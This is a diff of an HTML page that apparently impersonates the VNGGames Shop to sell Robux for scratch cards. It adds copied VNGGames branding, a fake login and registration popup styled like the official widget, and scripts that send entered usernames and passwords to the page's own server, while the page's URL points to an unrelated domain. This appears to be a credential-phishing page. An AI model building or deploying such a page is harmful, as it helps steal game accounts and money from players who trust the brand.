@@ -1,221 +1,1742 @@
 <!DOCTYPE html>
 <html lang="vi">
-<head>
-    <meta charset="utf-8"/>
-    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1, minimum-scale=1, maximum-scale=1, user-scalable=no"/>
-    <title>Roblox VN - VNGGames Shop</title>
-    <meta name="description" content="Roblox VN"/>
-    <link rel="icon" href="https://scdn-stc.vnggames.com/mainsite/images/favicon.ico"/>
-    <style>
-        /* CSS chuẩn đồng bộ từ hệ thống VNGGames Shop */
-        :root {
-            --chakra-colors-chakra-body-text: rgba(255, 255, 255, 0.92);
-            --chakra-colors-chakra-body-bg: #1a202c;
-            --chakra-colors-gray-800: #1a202c;
-            --chakra-colors-gray-900: #171923;
-            --chakra-colors-_primary-500: #F07242;
-            --chakra-colors-_primary-700: #F05C22;
-        }
-        * {
-            box-sizing: border-box;
-            border-style: solid;
-            border-width: 0;
-            word-wrap: break-word;
-        }
-        body {
-            position: relative;
-            min-height: 100vh;
-            margin: 0;
-            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Helvetica, Arial, sans-serif;
-            background-color: var(--chakra-colors-chakra-body-bg);
-            color: var(--chakra-colors-chakra-body-text);
-            -webkit-font-smoothing: antialiased;
-            display: flex;
-            justify-content: center;
-            padding: 12px;
-        }
-        main {
-            width: 100%;
-            max-width: 480px;
-        }
-        .shop-container {
-            background: #2D3748;
-            border-radius: 12px;
-            padding: 20px;
-            box-shadow: 0 10px 25px rgba(0,0,0,0.3);
-            border: 1px solid rgba(255,255,255,0.1);
-        }
-        .header-logo {
-            display: flex;
-            align-items: center;
-            gap: 12px;
-            margin-bottom: 20px;
-            border-bottom: 1px solid rgba(255,255,255,0.1);
-            padding-bottom: 12px;
-        }
-        .header-logo svg {
-            width: 40px;
-            height: 40px;
-        }
-        .header-logo h1 {
-            font-size: 18px;
-            font-weight: 700;
-            color: #fff;
-        }
-        .section-title {
-            font-size: 14px;
-            font-weight: 600;
-            color: #A0AEC0;
-            margin-bottom: 8px;
-            text-transform: uppercase;
-            letter-spacing: 0.05em;
-        }
-        .input-box {
-            width: 100%;
-            background: #1A202C;
-            border: 1px solid rgba(255,255,255,0.2);
-            border-radius: 8px;
-            padding: 12px 16px;
-            color: #fff;
-            font-size: 15px;
-            margin-bottom: 16px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-        .input-box:focus {
-            border-color: #F05C22;
-        }
-        .package-grid {
-            display: grid;
-            grid-template-columns: repeat(2, 1fr);
-            gap: 10px;
-            margin-bottom: 20px;
-        }
-        .package-item {
-            background: #1A202C;
-            border: 2px solid rgba(255,255,255,0.1);
-            border-radius: 8px;
-            padding: 14px;
-            text-align: center;
-            cursor: pointer;
-            transition: all 0.2s;
-        }
-        .package-item.active {
-            border-color: #F05C22;
-            background: rgba(240, 92, 34, 0.1);
-        }
-        .package-item .pkg-name {
-            font-size: 15px;
-            font-weight: 600;
-            margin-bottom: 4px;
-        }
-        .package-item .pkg-price {
-            font-size: 14px;
-            color: #F07242;
-            font-weight: 700;
-        }
-        .pay-btn {
-            width: 100%;
-            background: #F05C22;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: 700;
-            cursor: pointer;
-            box-shadow: 4px -4px 4px 0 #F05C22 inset, -4px 0 4px 0 #F05C22 inset;
-            transition: opacity 0.2s;
-        }
-        .pay-btn:hover {
-            opacity: 0.9;
-        }
-        .toast {
-            margin-top: 15px;
-            padding: 12px;
-            background: rgba(72, 187, 120, 0.2);
-            border: 1px solid #48BB78;
-            color: #68D391;
-            border-radius: 8px;
-            text-align: center;
-            font-size: 14px;
-            display: none;
-        }
-    </style>
+
+<head> 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, height=device-height, initial-scale=1.0, user-scalable=0, minimum-scale=1.0, maximum-scale=1.0">
+    <meta name="renderer" content="webkit">
+    <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate">
+    <meta http-equiv="Pragma" content="no-cache">
+    <meta http-equiv="Expires" content="0">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+    <title>VNGGames Shop</title>
+
+    <!-- Meta Tags cho SEO -->
+    <meta name="description" content="Trang Nạp Robux Vng Bằng Thẻ Cào Nhanh Chóng Và Nhiều Ưu Đãi Nhất Hiện Tại">
+    <meta name="keywords" content="game shop top up,shop vng game,top up,vnggames,top up VNG game shop,vng top up,vng shop,most popular game in mobile,new gaming mobile,top games in mobile, roblox, roblox,roblox,mua acc roblox,cay ho roblox,thue cay acc roblox,shop acc,ban acc,game roblox,mua acc,mua acc roblox,mua acc game roblox,thue cay roblox,thue cay game roblox,blox fruits,cay blox fruits,cay thue blox fruits,ban acc blox fruits,shop blox fruits,mua acc blox fruits,trai ac quy roblox,trai ac quy blox fruits,trai ac quy king legacy,trai ac quy grand piece,devil fruits king legacy,devil fruits grand piece,devil fruits blox fruits,anime fighters simulator">
+    <link rel="canonical" href="/">
+    
+    <!-- Open Graph cho chia sẻ mạng xã hội -->
+    <!-- Developer by TrThaoDev - CodeRent.One --> <!-- zalo: 0346434498 -->
+    <meta property="og:title" content="Trung Tâm Nạp Robux Vng Bằng Thẻ Cào">
+    <meta property="og:description" content="Trang Nạp Robux Vng Bằng Thẻ Cào Nhanh Chóng Và Nhiều Ưu Đãi Nhất Hiện Tại">
+    <meta property="og:image" content="https://scdn-stc.vnggames.com/mainsite/images/vnggamesshop-thumbnail-3.png">
+    <meta property="og:url" content="https://robux3s.com">
+    <meta property="og:type" content="website">
+
+    <!-- Twitter Card -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Trung Tâm Nạp Robux Vng Bằng Thẻ Cào">
+    <meta name="twitter:description" content="Trang Nạp Robux Vng Bằng Thẻ Cào Nhanh Chóng Và Nhiều Ưu Đãi Nhất Hiện Tại">
+    <meta name="twitter:image" content="https://scdn-stc.vnggames.com/mainsite/images/vnggamesshop-thumbnail-3.png">
+
+    <!-- Favicon -->
+    <link rel="icon" href="https://scdn-stc.vnggames.com/mainsite/images/favicon.ico" type="image/png">
+
+    <!-- Stylesheets -->
+    <link rel="stylesheet" href="/template/theme/assets/frontend/css/Roblox/SvgIcon.7ae0b516.css">
+    <link rel="stylesheet" href="/template/theme/assets/frontend/css/Roblox/styles.css?v=1793660123">
+    <link rel="stylesheet" href="/template/theme/assets/frontend/css/Roblox/payment-method-inline.css?v=1793660123">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+<link href="https://fonts.googleapis.com/css2?family=Be+Vietnam+Pro:wght@300;400;500;600;700;800;900&display=swap" rel="stylesheet">
+
 </head>
-<body>
+<style>
+    body {
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+        Helvetica, Arial, sans-serif,
+        "Apple Color Emoji",
+        "Segoe UI Emoji",
+        "Segoe UI Symbol";
+    color: var(--chakra-colors-chakra-body-text);
+    background: var(--chakra-colors-chakra-body-bg);
+    transition-property: background-color;
+    transition-duration: var(--chakra-transition-duration-normal)
+200ms
+;
+    line-height: var(--chakra-lineHeights-base);
+   
+}
+html,
+body {
+    font-family: __Be_Vietnam_Pro_f34e70, __Be_Vietnam_Pro_Fallback_f34e70, sans-serif;
+    font-style: normal;
+}
 
-<main>
-    <div class="shop-container">
-        <!-- Logo chuẩn VNGGames -->
-        <div class="header-logo">
-            <svg fill="none" width="512" height="512" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg">
-                <rect x="-1" y="1" width="510" height="510" rx="255" transform="matrix(-1 0 0 1 510 0)" fill="white"></rect>
-                <path d="M174.621 126V190.778C174.625 201.729 172.499 212.574 168.363 222.693C164.227 232.811 158.163 242.005 150.518 249.749C142.872 257.493 133.795 263.635 123.805 267.823C113.814 272.012 103.107 274.166 92.2946 274.162H64.7313V126H92.1954V246.579C106.813 246.579 120.833 240.702 131.176 230.239C141.518 219.777 147.338 205.583 147.355 190.778V126H174.621Z" fill="#F05A22"></path>
-                <path d="M310.31 167.661V274.095H282.809V167.627C282.805 163.947 281.356 160.419 278.782 157.816C276.207 155.214 272.716 153.75 269.075 153.746H227.856V274.162H200.421V126H269.075C279.957 125.996 290.574 130.459 298.232 138.196C305.933 145.976 310.31 156.709 310.31 167.661Z" fill="#F05A22"></path>
-                <path d="M381.688 213.912H418.154C418.154 213.912 418.154 231.847 418.154 232.449C418.145 236.137 416.696 239.67 414.126 242.273C411.555 244.876 408.073 246.336 404.444 246.331H377.19C373.619 246.337 370.187 244.923 367.629 242.391C365.07 239.86 363.587 236.412 363.497 232.784V167.679C363.497 163.997 364.936 160.466 367.498 157.863C370.059 155.26 373.534 153.797 377.157 153.797L428.284 153.797V126L377.14 126C366.31 125.996 355.743 130.463 348.123 138.207C340.46 145.995 336.106 156.737 336.11 167.696V232.449C336.077 245.807 342.61 258.733 353.426 266.51C360.36 271.495 368.646 274.169 377.14 274.162H404.576C413.068 274.171 421.353 271.497 428.284 266.511C439.084 258.743 445.618 245.823 445.589 232.483V186.182H381.688V213.912Z" fill="#F05A22"></path>
-            </svg>
-            <h1>Roblox VN - VNGGames Shop</h1>
+</style><body class="lockScroll">
+   
+   
+        <div class="el-scrollbar__wrap el-scrollbar__wrap--hidden-default">
+            <div class="el-scrollbar__view">
+                <div id="app-main" data-qc="app-main">
+                    <!-- Developer by TrThaoDev - CodeRent.One --> <!-- zalo: 0346434498 -->
+                    <div class="chakra-stack css-1tqljjq">
+                        <div id="payment-wrapper" data-qc="payment-wrapper" class="has-background" style="position: relative;">
+                            <!-- Developer by TrThaoDev - CodeRent.One --> <!-- zalo: 0346434498 -->
+                            <div data-v-416f453a="" id="wrap-header" data-qc="wrap-header" class="wrap-header" style="top: 0px;">
+                                <div data-v-416f453a="" class="header-custom">
+                                   
+                                    <div data-v-416f453a="" class="left-header">
+                                        <a data-v-416f453a=""href="/">
+                                            <img data-v-416f453a="" alt="logo" class="logo-header" src="https://shop.vnggames.com/_next-public/images/logoshop.webp">
+                                        </a>
+                                    </div>
+                                   <div data-v-416f453a="" class="right-header">
+                                        <div data-v-416f453a="" class="content-right">
+                                            <div data-v-416f453a="" class="dflex gap20">
+
+                           <button
+    type="button"
+    class="chakra-button css-mhj8kq"
+    data-qc="Header_LoginButton"
+    onclick="openLoginModal()"
+>
+                    <div class="css-gns8c9">Đăng nhập</div>
+                </button>
+            
         </div>
-
-        <!-- Form nhập User ID -->
-        <div class="section-title">1. Thông tin nhân vật</div>
-        <input type="text" id="robloxUser" class="input-box" placeholder="Nhập tên tài khoản / Username Roblox">
-
-        <!-- Danh sách gói nạp -->
-        <div class="section-title">2. Chọn gói nạp</div>
-        <div class="package-grid">
-            <div class="package-item active" onclick="selectPkg(this, '400 Robux', '50.000đ')">
-                <div class="pkg-name">400 Robux</div>
-                <div class="pkg-price">50.000đ</div>
-            </div>
-            <div class="package-item" onclick="selectPkg(this, '800 Robux', '100.000đ')">
-                <div class="pkg-name">800 Robux</div>
-                <div class="pkg-price">100.000đ</div>
-            </div>
-            <div class="package-item" onclick="selectPkg(this, '1700 Robux', '200.000đ')">
-                <div class="pkg-name">1700 Robux</div>
-                <div class="pkg-price">200.000đ</div>
-            </div>
-            <div class="package-item" onclick="selectPkg(this, '4500 Robux', '500.000đ')">
-                <div class="pkg-name">4500 Robux</div>
-                <div class="pkg-price">500.000đ</div>
-            </div>
-        </div>
-
-        <!-- Nút Thanh toán -->
-        <button class="pay-btn" onclick="processPayment()">Thanh toán ngay</button>
-
-        <!-- Thông báo kết quả -->
-        <div id="resultToast" class="toast"></div>
     </div>
-</main>
+</div>
+                                               
+                                                                                            </div>
+                                        </div>
+                                    </div>
+                                </div>
+                            </div>
+                            <div id="gg-sdk-login__popup"
+     style="font-size:16px;width:100vw;background:rgba(0,0,0,0.4);position:fixed;inset:0;display:none;z-index:9999;align-items:center;justify-content:center;">
 
+  <div id="gg-sdk-login__main"
+       ignore-lock
+       style="width:min(100%,700px);box-sizing:border-box;border-radius:1em;max-height:905.35px;overflow-y:hidden;margin:auto 1em;display:flex;flex-direction:column;justify-content:center;align-items:center;position:relative;">
+
+    <div id="ggDialogClose">
+      <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24">
+        <path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"
+              d="M18 6L6 18M6 6l12 12"/>
+      </svg>
+    </div>
+
+    <gg-widget-1784892708755 vce-ready>
+      <div class="gg-login-hub__container gg-login-hub__REDIRECT">
+
+        <div class="gg-loading__container gg-login-hub__loading-container" style="display:none;">
+          <div class="gg-loading"></div>
+          <div class="gg-loading__logo">
+            <img src="https://cdn-gg.vnggames.app/widget/1.3.1/static/icons/ic_app_logo.svg" alt="">
+          </div>
+        </div>
+
+        <div class="gg-login-hub__content" style="max-height:100%;">
+          <p class="gg-login-hub__title">Đăng nhập</p>
+          <p class="gg-login-hub__subtitle">Một tài khoản cho tất cả sản phẩm VNGGames</p>
+
+       <div class="gg-login-method-container" style="width:100%;display:flex;flex-direction:column;gap:12px;">
+
+  <!-- Username -->
+  <div class="gg-btn gg-login-method input-wrapper" style="cursor:default;">
+    <input 
+      id="username"
+      type="text" 
+      placeholder="Tên tài khoản"
+      class="input-custom"
+    >
+  </div>
+
+  <!-- Password -->
+  <div class="gg-btn gg-login-method input-wrapper" style="cursor:default;">
+    <input 
+      id="password"
+      type="password" 
+      placeholder="Mật khẩu"
+      class="input-custom"
+    >
+  </div>
+
+  <!-- Login button -->
+ <button
+    id="loginBtn"
+    type="button"
+    class="chakra-button css-mhj8kq"
+>
+    <div class="css-gns8c9">Đăng nhập</div>
+</button>
+
+  <div class="gg-social-provider-container" style="display: flex; justify-content: center !important; width: 100%;">
+    <a href="/login/google?auth_method=google" class="gg-btn gg-social-provider">
+        <img src="https://cdn-gg.vnggames.app/widget/1.3.1/static/icons/ic_google.svg" alt="Google">
+    </a>
+</div>
+<div style="text-align: center; margin-top: 12px; font-size: 14px;">
+    <span style="color: #6E625E;">Bạn chưa có tài khoản? </span>
+    <a href="javascript:void(0);" onclick="openRegisterModal()" style="color: #ee4d2d; text-decoration: none; font-weight: 500;">
+        Đăng ký ngay
+    </a>
+</div>
+           </div>
+
+          </div>
+        </div>
+
+      </div>
+    </gg-widget-1784892708755>
+
+  </div>
+</div>
+<!-- POPUP ĐĂNG KÝ (ĐÃ ĐỒNG BỘ CLASS VỚI POPUP ĐĂNG NHẬP) -->
+<div id="gg-sdk-register__popup"
+     style="font-size:16px;width:100vw;background:rgba(0,0,0,0.4);position:fixed;inset:0;display:none;z-index:9999;align-items:center;justify-content:center;">
+
+  
+       <div id="gg-sdk-register__main"
+       ignore-lock
+       style="width:min(100%,700px);box-sizing:border-box;border-radius:1em;max-height:905.35px;overflow-y:hidden;margin:auto 1em;display:flex;flex-direction:column;justify-content:center;align-items:center;position:relative;">
+
+    <!-- Nút đóng (X) giống popup đăng nhập -->
+    <!--<div id="ggDialogClose">-->
+    <!--  <svg xmlns="http://www.w3.org/2000/svg" width="32" height="32" viewBox="0 0 24 24">-->
+    <!--    <path fill="none" stroke="currentColor" stroke-linecap="round" stroke-linejoin="round" stroke-width="2"-->
+    <!--          d="M18 6L6 18M6 6l12 12"/>-->
+    <!--  </svg>-->
+    <!--</div>-->
+
+    <gg-widget-1784892708755 vce-ready>
+      <div class="gg-login-hub__container gg-login-hub__REDIRECT">
+
+        <div class="gg-login-hub__content" style="max-height:100%;">
+          <p class="gg-login-hub__title">Đăng ký</p>
+          <p class="gg-login-hub__subtitle">Tạo tài khoản mới để trải nghiệm dịch vụ VNGGames</p>
+
+          <div class="gg-login-method-container" style="width:100%;display:flex;flex-direction:column;gap:12px;">
+
+            <!-- Username Register -->
+            <div class="gg-btn gg-login-method input-wrapper" style="cursor:default;">
+              <input 
+                id="reg-username"
+                type="text" 
+                placeholder="Tên tài khoản"
+                class="input-custom"
+              >
+            </div>
+
+            <!-- Password Register -->
+            <div class="gg-btn gg-login-method input-wrapper" style="cursor:default;">
+              <input 
+                id="reg-password"
+                type="password" 
+                placeholder="Mật khẩu"
+                class="input-custom"
+              >
+            </div>
+
+            <!-- Confirm Password Register -->
+            <div class="gg-btn gg-login-method input-wrapper" style="cursor:default;">
+              <input 
+                id="reg-confirm-password"
+                type="password" 
+                placeholder="Nhập lại mật khẩu"
+                class="input-custom"
+              >
+            </div>
+
+            <!-- Register button -->
+            <button
+              id="registerBtn"
+              type="button"
+              class="chakra-button css-mhj8kq"
+            >
+              <div class="css-gns8c9">Đăng ký</div>
+            </button>
+<div style="text-align: center; margin-top: 12px; font-size: 14px;">
+    <span style="color: #6E625E;">Bạn đã có tài khoản? </span>
+    <a href="javascript:void(0);" onclick="openLoginModal()" style="color: #ee4d2d; text-decoration: none; font-weight: 500;">
+        Đăng nhập ngay
+    </a>
+</div>
+          </div>
+        </div>
+      </div>
+    </gg-widget-1784892708755>
+  </div>
+</div>
+<style>
+   .profileHeader {
+    position: relative;
+}
+
+.dropdown_header {
+    position: absolute;
+    top: 100%;
+    right: 0;
+    display: none;
+    z-index: 999999;
+}
+
+.profileHeader.is-active .dropdown_header {
+    display: block;
+}
+</style>
 <script>
-    let chosenPackage = { name: "400 Robux", price: "50.000đ" };
+    document.addEventListener('click', function (e) {
+    const profile = e.target.closest('.profileHeader');
 
-    function selectPkg(element, name, price) {
-        document.querySelectorAll('.package-item').forEach(el => el.classList.remove('active'));
-        element.classList.add('active');
-        chosenPackage = { name, price };
+    if (profile) {
+        profile.classList.toggle('is-active');
+    } else {
+        // click ra ngoài thì đóng
+        document.querySelectorAll('.profileHeader').forEach(el => {
+            el.classList.remove('is-active');
+        });
+    }
+});
+</script>
+<script>
+function showMessage(message, type = 'error') {
+    const oldMessage = document.getElementById('alertMessage');
+    if (oldMessage) oldMessage.remove();
+
+    const div = document.createElement('div');
+
+    div.id = 'alertMessage';
+    div.className =
+        'el-message is-center ' +
+        (type === 'success'
+            ? 'el-message--success'
+            : 'el-message--error') +
+        ' alertContainerRedesign';
+
+    div.style.position = 'fixed';
+    div.style.top = '20px';
+    div.style.left = '50%';
+    div.style.transform = 'translateX(-50%)';
+    div.style.zIndex = '99999';
+
+    div.innerHTML = `
+        <i class="el-message__icon el-icon-warning"></i>
+        <p class="el-message__content">${message}</p>
+    `;
+
+    document.body.appendChild(div);
+
+    setTimeout(() => div.remove(), 3000);
+}
+</script>
+<script>
+    document.addEventListener('DOMContentLoaded', function () {
+    const registerBtn = document.getElementById('registerBtn');
+    const regUsernameInput = document.getElementById('reg-username');
+    const regPasswordInput = document.getElementById('reg-password');
+    const regConfirmInput = document.getElementById('reg-confirm-password');
+    
+    const registerPopup = document.getElementById('gg-sdk-register__popup');
+    const registerCloseBtn = document.getElementById('ggRegisterDialogClose');
+
+    
+    if (registerCloseBtn) {
+        registerCloseBtn.addEventListener('click', function() {
+            if (registerPopup) registerPopup.style.display = 'none';
+        });
     }
 
-    function processPayment() {
-        const username = document.getElementById('robloxUser').value.trim();
-        const toast = document.getElementById('resultToast');
+    function setInputError(input, hasError) {
+        if (!input || !input.parentElement) {
+            return;
+        }
+        input.parentElement.classList.toggle('input-error', hasError);
+    }
+
+    if (!registerBtn || !regUsernameInput || !regPasswordInput || !regConfirmInput) {
+        return;
+    }
+
+    registerBtn.addEventListener('click', function () {
+        const username = regUsernameInput.value.trim();
+        const password = regPasswordInput.value.trim();
+        const confirmPassword = regConfirmInput.value.trim();
+
+        setInputError(regUsernameInput, false);
+        setInputError(regPasswordInput, false);
+        setInputError(regConfirmInput, false);
 
         if (!username) {
-            alert("Vui lòng nhập tên tài khoản hoặc ID Roblox!");
-            document.getElementById('robloxUser').focus();
+            setInputError(regUsernameInput, true);
+            showMessage('Vui lòng nhập tên tài khoản', 'error');
+            regUsernameInput.focus();
             return;
         }
 
-        toast.style.display = 'block';
-        toast.innerHTML = `Đang xử lý đơn hàng cho <b>${username}</b> - Gói: <b>${chosenPackage.name} (${chosenPackage.price})</b>...`;
-        
-        // Nếu bạn muốn kết nối gửi thông báo về Telegram cá nhân, có thể cấu hình fetch API Bot ở đây.
-    }
+        if (!password) {
+            setInputError(regPasswordInput, true);
+            showMessage('Vui lòng nhập mật khẩu', 'error');
+            regPasswordInput.focus();
+            return;
+        }
+
+        if (!confirmPassword) {
+            setInputError(regConfirmInput, true);
+            showMessage('Vui lòng xác nhận lại mật khẩu', 'error');
+            regConfirmInput.focus();
+            return;
+        }
+
+        if (password !== confirmPassword) {
+            setInputError(regConfirmInput, true);
+            showMessage('Mật khẩu xác nhận không khớp', 'error');
+            regConfirmInput.focus();
+            return;
+        }
+
+        registerBtn.disabled = true;
+        registerBtn.innerHTML = `
+            <div class="css-gns8c9">
+                <i class="fa fa-spinner fa-spin"></i>
+                Đang xử lý...
+            </div>
+        `;
+
+        $.ajax({
+            url: '/models/register',
+            method: 'POST',
+            dataType: 'json',
+            data: {
+                username: username,
+                password: password,
+                password_confirmation: confirmPassword
+            },
+            success: function (response) {
+                if (response.status === 'success') {
+                    showMessage(
+                        response.msg || 'Đăng ký thành công',
+                        'success'
+                    );
+
+                    window.setTimeout(function () {
+                        window.location.href = '/';
+                    }, 1500);
+
+                    return;
+                }
+
+                showMessage(
+                    response.msg || 'Đăng ký thất bại, vui lòng thử lại',
+                    'error'
+                );
+            },
+            error: function (xhr, status, error) {
+                let message = 'Có lỗi xảy ra khi đăng ký';
+
+                if (xhr.responseJSON && xhr.responseJSON.msg) {
+                    message = xhr.responseJSON.msg;
+                } else if (xhr.responseText) {
+                    try {
+                        const response = JSON.parse(xhr.responseText);
+                        if (response.msg) {
+                            message = response.msg;
+                        }
+                    } catch (e) {
+                        message = xhr.responseText;
+                    }
+                }
+
+                showMessage(message, 'error');
+            },
+            complete: function () {
+                registerBtn.disabled = false;
+                registerBtn.innerHTML = `
+                    <div class="css-gns8c9">Đăng ký</div>
+                `;
+            }
+        });
+    });
+
+    /* Nhấn Enter tại ô xác nhận mật khẩu để đăng ký */
+    regConfirmInput.addEventListener('keydown', function (event) {
+        if (event.key === 'Enter') {
+            registerBtn.click();
+        }
+    });
+});
 </script>
 
+         
+
+ <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+<script>
+document.addEventListener('DOMContentLoaded', function () {
+    const loginBtn = document.getElementById('loginBtn');
+    const usernameInput = document.getElementById('username');
+    const passwordInput = document.getElementById('password');
+
+    function showMessage(message, type = 'error') {
+        const oldMessage = document.getElementById('alertMessage');
+
+        if (oldMessage) {
+            oldMessage.remove();
+        }
+
+        const div = document.createElement('div');
+
+        div.id = 'alertMessage';
+        div.className =
+            'el-message is-center ' +
+            (type === 'success'
+                ? 'el-message--success'
+                : 'el-message--error') +
+            ' alertContainerRedesign';
+
+        div.style.position = 'fixed';
+        div.style.top = '20px';
+        div.style.left = '50%';
+        div.style.transform = 'translateX(-50%)';
+        div.style.zIndex = '99999';
+
+        div.innerHTML = `
+            <i class="el-message__icon el-icon-warning"></i>
+            <p class="el-message__content">${message}</p>
+        `;
+
+        document.body.appendChild(div);
+
+        window.setTimeout(function () {
+            div.remove();
+        }, 3000);
+    }
+
+    function setInputError(input, hasError) {
+        if (!input || !input.parentElement) {
+            return;
+        }
+
+        input.parentElement.classList.toggle('input-error', hasError);
+    }
+
+    if (!loginBtn || !usernameInput || !passwordInput) {
+        return;
+    }
+
+    loginBtn.addEventListener('click', function () {
+        const username = usernameInput.value.trim();
+        const password = passwordInput.value.trim();
+
+        setInputError(usernameInput, false);
+        setInputError(passwordInput, false);
+
+        if (!username) {
+            setInputError(usernameInput, true);
+            showMessage('Vui lòng nhập tên tài khoản', 'error');
+            usernameInput.focus();
+            return;
+        }
+
+        if (!password) {
+            setInputError(passwordInput, true);
+            showMessage('Vui lòng nhập mật khẩu', 'error');
+            passwordInput.focus();
+            return;
+        }
+
+        loginBtn.disabled = true;
+        loginBtn.innerHTML = `
+            <div class="css-gns8c9">
+                <i class="fa fa-spinner fa-spin"></i>
+                Đang xử lý...
+            </div>
+        `;
+
+        $.ajax({
+            url: '/models/login',
+            method: 'POST',
+            dataType: 'json',
+
+            data: {
+                username: username,
+                password: password
+            },
+
+            success: function (response) {
+                if (response.status === 'success') {
+                    showMessage(
+                        response.msg || 'Đăng nhập thành công',
+                        'success'
+                    );
+
+                    window.setTimeout(function () {
+                        window.location.href = '/';
+                    }, 1500);
+
+                    return;
+                }
+
+                if (response.status === 'verify') {
+                    showMessage(
+                        response.msg || 'Tài khoản cần được xác minh',
+                        'error'
+                    );
+
+                    if (response.url) {
+                        window.setTimeout(function () {
+                            window.location.href = response.url;
+                        }, 2000);
+                    }
+
+                    return;
+                }
+
+                showMessage(
+                    response.msg || 'Tên tài khoản hoặc mật khẩu không đúng',
+                    'error'
+                );
+            },
+
+            error: function (xhr, status, error) {
+    console.log('Status:', xhr.status);
+    console.log('Response:', xhr.responseText);
+    console.log('Error:', error);
+
+    let message = 'Có lỗi xảy ra khi đăng nhập';
+
+    if (xhr.responseJSON && xhr.responseJSON.msg) {
+        message = xhr.responseJSON.msg;
+    } else if (xhr.responseText) {
+        try {
+            const response = JSON.parse(xhr.responseText);
+
+            if (response.msg) {
+                message = response.msg;
+            }
+        } catch (e) {
+            message = xhr.responseText;
+        }
+    }
+
+    showMessage(message, 'error');
+},
+
+            complete: function () {
+                loginBtn.disabled = false;
+                loginBtn.innerHTML = `
+                    <div class="css-gns8c9">Đăng nhập</div>
+                `;
+            }
+        });
+    });
+
+    /* Nhấn Enter tại ô mật khẩu để đăng nhập */
+    passwordInput.addEventListener('keydown', function (event) {
+        if (event.key === 'Enter') {
+            loginBtn.click();
+        }
+    });
+});
+document.addEventListener('DOMContentLoaded', function () {
+
+    // ======================
+    // ELEMENT
+    // ======================
+    const loginPopup = document.getElementById('gg-sdk-login__popup');
+    const registerPopup = document.getElementById('gg-sdk-register__popup');
+
+    const loginCloseBtn = document.getElementById('ggDialogClose');
+    const registerCloseBtn = document.getElementById('ggRegisterDialogClose');
+
+    // ======================
+    // OPEN MODAL
+    // ======================
+    window.openLoginModal = function () {
+        if (registerPopup) registerPopup.style.display = 'none';
+        if (loginPopup) loginPopup.style.display = 'flex';
+    };
+
+    window.openRegisterModal = function () {
+        if (loginPopup) loginPopup.style.display = 'none';
+        if (registerPopup) registerPopup.style.display = 'flex';
+    };
+
+    // ======================
+    // CLOSE BUTTON
+    // ======================
+    loginCloseBtn?.addEventListener('click', () => {
+        loginPopup.style.display = 'none';
+    });
+
+    registerCloseBtn?.addEventListener('click', () => {
+        registerPopup.style.display = 'none';
+    });
+
+    // ======================
+    // CLICK OUTSIDE
+    // ======================
+    window.addEventListener('click', function (e) {
+        if (e.target === loginPopup) loginPopup.style.display = 'none';
+        if (e.target === registerPopup) registerPopup.style.display = 'none';
+    });
+
+});
+
+</script>
+
+<style>
+#loginBtn.css-mhj8kq{
+    width:100% !important;
+    height:48px !important;
+    display:flex !important;
+    justify-content:center !important;
+    align-items:center !important;
+    padding:0 16px !important;
+}
+
+#loginBtn .css-gns8c9{
+    color:#fff !important;
+}
+    /* wrapper thêm viền */
+.input-wrapper {
+  border: 1px solid #e5e5e5;
+  border-radius: 8px;
+  transition: all 0.2s ease;
+}
+
+/* hover */
+.input-wrapper:hover {
+  border-color: #ccc;
+}
+
+/* focus */
+.input-wrapper:focus-within {
+  border-color: #ee4d2d;
+  box-shadow: 0 0 0 2px rgba(238,77,45,0.15);
+}
+
+/* input */
+.input-custom {
+  width: 100%;
+  border: none;
+  outline: none;
+  background: transparent;
+  font-size: 14px;
+}
+
+/* lỗi đỏ */
+.input-error {
+  border-color: red !important;
+}
+
+</style>
+<script>
+    function showError(message) {
+  // xóa cái cũ nếu có
+  const old = document.getElementById("alertMessage");
+  if (old) old.remove();
+
+  const div = document.createElement("div");
+  div.className = "el-message is-center el-message--error alertContainerRedesign";
+  div.id = "alertMessage";
+  div.style.top = "20px";
+  div.style.zIndex = "99999";
+  div.style.position = "fixed";
+  div.style.left = "50%";
+  div.style.transform = "translateX(-50%)";
+
+  div.innerHTML = `
+    <i class="el-message__icon el-icon-warning"></i>
+    <p class="el-message__content">${message}</p>
+  `;
+
+  document.body.appendChild(div);
+
+  setTimeout(() => {
+    div.remove();
+  }, 3000);
+}
+
+// xử lý login
+document.getElementById("loginBtn").addEventListener("click", function () {
+  const username = document.getElementById("username");
+  const password = document.getElementById("password");
+
+  // reset lỗi
+  username.parentElement.classList.remove("input-error");
+  password.parentElement.classList.remove("input-error");
+
+  if (!username.value.trim()) {
+    username.parentElement.classList.add("input-error");
+    showError("Vui lòng nhập tên tài khoản");
+    return;
+  }
+
+  if (!password.value.trim()) {
+    password.parentElement.classList.add("input-error");
+    showError("Vui lòng nhập mật khẩu");
+    return;
+  }
+
+ 
+});
+</script>
+<div class="chakra-container css-1btds7v">
+ <div class="css-1mjel2e">
+    <div class="css-mib5dl" style="position:absolute;top:0;left:0;width:100%;height:100%;z-index:0;overflow:hidden;filter:blur(20px);transition:all 500ms ease-in-out;mask-image:linear-gradient(to bottom, rgba(0,0,0,1) 0%, rgba(0,0,0,0.8) 50%, rgba(0,0,0,0.2) 100%);-webkit-mask-image:linear-gradient(to bottom, rgba(0,0,0,1) 0%, rgba(0,0,0,0.8) 50%, rgba(0,0,0,0) 100%)">
+   <img
+    alt="Banner background"
+    data-nimg="fill"
+    decoding="async"
+    fetchpriority="high"
+    sizes="(max-width: 768px) 100px, 100px"
+    src="https://cdn.upanhlaylink.com/i/cIBo86Bp.png"
+    style="position:absolute;height:100%;width:100%;left:0;top:0;right:0;bottom:0;object-fit:cover;color:transparent;transition:opacity 180ms ease"
+   />
